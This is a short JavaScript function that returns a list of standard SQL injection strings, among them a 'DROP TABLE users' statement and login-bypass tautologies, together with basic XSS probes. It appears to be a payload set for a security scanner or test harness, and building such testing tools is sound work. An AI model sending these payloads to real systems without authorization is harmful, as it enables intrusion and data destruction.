export function getPayloads() {
    const sqlPayloads = [
      "' OR '1'='1",
      "' UNION SELECT null, null, null--",
      "'; DROP TABLE users;--",
      "admin' --",
      "' OR 1=1--"
    ];
  
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('XSS')>",
      "<body onload=alert('XSS')>",
      "javascript:alert('XSS')"
    ];
  
    return [...sqlPayloads, ...xssPayloads];
  }
  